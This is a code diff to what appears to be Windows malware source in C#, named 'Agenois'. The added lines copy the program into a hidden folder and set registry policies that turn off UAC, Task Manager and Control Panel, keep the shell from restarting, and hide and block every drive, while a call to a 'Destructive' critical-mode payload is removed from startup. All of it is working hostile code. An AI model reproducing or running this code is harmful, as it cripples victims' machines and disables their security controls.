@@ -34,13 +34,38 @@ namespace Agenois
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
             {
                 Directory.CreateDirectory(extractPath);
+                //File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
+
+                DirectoryInfo ch = new DirectoryInfo(extractPath);
+                ch.Attributes = FileAttributes.Hidden;
+
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoControlPanel", "1");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
+                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("DisableTaskMgr", "1");
+                editKey.Close();
+
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
+                editKey.Close();
+
             }
         }
 
         private void MainThread_Load(object sender, EventArgs e)
         {
-            //Everything on startup.
-            Payloads.Destructive.EnableCriticalMode();
+
         }
     }
 }
